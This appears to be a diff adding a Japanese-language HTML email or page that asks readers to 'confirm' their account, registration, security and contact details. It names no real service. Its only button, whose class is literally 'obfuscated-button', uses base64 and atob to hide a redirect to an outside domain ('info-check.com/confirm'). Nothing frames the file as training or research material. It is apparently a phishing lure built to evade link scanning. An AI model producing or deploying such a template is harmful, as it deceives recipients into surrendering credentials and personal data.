@@ -1,0 +1,56 @@
+<!DOCTYPE html>
+<html lang="ja-JP">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>情報確認のお願い</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { font-family: 'Segoe UI', 'Arial', sans-serif; background-color: #f5f5f5; }
+        .container { max-width: 600px; margin: 20px auto; background: #fff; border-radius: 12px; box-shadow: 0 4px 12px rgba(0,0,0,0.15); }
+        .header { background: linear-gradient(135deg, #00796b 0%, #004d40 100%); color: #fff; padding: 35px 20px; text-align: center; }
+        .header h2 { font-size: 26px; margin: 0; font-weight: 600; }
+        .content { padding: 35px 25px; color: #333; line-height: 1.7; }
+        .content p { margin: 14px 0; font-size: 14px; color: #555; }
+        .divider { height: 1px; background: linear-gradient(90deg, transparent, #ddd, transparent); margin: 25px 0; }
+        .obfuscated-button { background: linear-gradient(135deg, #00796b 0%, #004d40 100%); color: #fff; padding: 14px 35px; text-decoration: none; border-radius: 6px; font-size: 15px; font-weight: 600; margin: 20px 0; transition: all 0.3s ease; box-shadow: 0 4px 10px rgba(0, 121, 107, 0.3); border: none; cursor: pointer; display: inline-block; }
+        .obfuscated-button:hover { background: linear-gradient(135deg, #004d40 0%, #00251a 100%); box-shadow: 0 6px 15px rgba(0, 121, 107, 0.4); transform: translateY(-2px); }
+        .button-container { text-align: center; margin: 25px 0; }
+        .footer { padding: 15px 20px; background: #fafafa; border-top: 1px solid #eee; text-align: center; font-size: 12px; color: #888; }
+        .info-box { background: #f0f8f7; border-left: 4px solid #00796b; padding: 15px; margin: 15px 0; border-radius: 4px; }
+    </style>
+</head>
+<body>
+    <!-- meta: kd-97-erdhvfg | evdhrvfg -->
+    <div class="container">
+        <div class="header">
+            <h2>ご登録情報のご確認</h2>
+        </div>
+        <div class="content">
+            <p>いつもご利用ありがとうございます。</p>
+            <p>ご登録情報の確認をお願いいたします。</p>
+            <div class="divider"></div>
+            <div class="info-box">
+                <p><strong>ご確認いただく内容：</strong></p>
+                <p style="margin-top: 8px; font-size: 13px;">
+                    • アカウント情報<br>
+                    • 登録情報<br>
+                    • セキュリティ設定<br>
+                    • 連絡先情報
+                </p>
+            </div>
+            <div class="divider"></div>
+            <p>お手数ですが、セキュアゲートウェイから情報をご確認ください。</p>
+            <div class="button-container">
+                <button class="obfuscated-button" onclick="window.location.href=atob('aHR0cHM6Ly9pbmZvLWNoZWNrLmNvbS9jb25maXJt');">
+                    情報確認に進む
+                </button>
+            </div>
+            <div class="divider"></div>
+            <p style="font-size: 13px; color: #888;">ご不明な点がございましたら、サポートまでお気軽にお問い合わせください。</p>
+        </div>
+        <div class="footer"><p>&copy; 2025 情報管理システム</p></div>
+    </div>
+</body>
+</html>
+
